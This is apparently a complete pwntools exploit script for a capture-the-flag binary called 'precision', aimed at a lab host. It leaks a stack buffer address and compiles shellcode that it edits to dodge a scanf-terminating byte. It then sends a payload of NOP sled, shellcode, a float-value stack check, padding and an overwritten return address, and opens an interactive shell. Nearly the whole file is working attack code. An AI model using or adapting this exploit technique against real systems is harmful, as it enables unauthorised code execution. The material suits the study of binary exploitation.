#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('precision')

host = args.HOST or '10.67.0.1'
port = int(args.PORT or 31477)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments
# -- Exploit goes here --
# 0xffffc6b8:	0x475a31a5	0x40501555

context.terminal = ["gnome-terminal", "-e"]
io = start()

shell_space_sz = 0x80
float_value = p32(0x475a31a5) + p32(0x40501555)

# let's read the buffer address
io.recvuntil(": ")
addr = int(io.recvline()[2:].strip(), 16)
log.info(hex(addr))

# let's create the payload -> nop paddding + shell + float + 4 bytes junk + EIP
# yep, we need a shell without \n or \x00 characters
import os
os.system("nasm shellcode32.asm -o shellcode32.o") # compile the shell
with open("shellcode32.o", "rb") as f:
    shell = f.read()
    shell = shell.strip()

from binascii import hexlify
log.info("Shell: " + hexlify(shell))

log.info(len(shell))

"""
After some research I discovered that 0xb was the byte that ends the scanf
So, in order to escape this thing I modified
mov al, 0xb
into
mov al, 0x5
add al, 0x6

0x5 + 0x6 = 0xb :D
"""
payload = "\x90" * (shell_space_sz - len(shell)) + shell + float_value + cyclic(cyclic_find('daaa')) + p32(addr)
log.info(payload)

io.sendline(payload)

io.interactive()

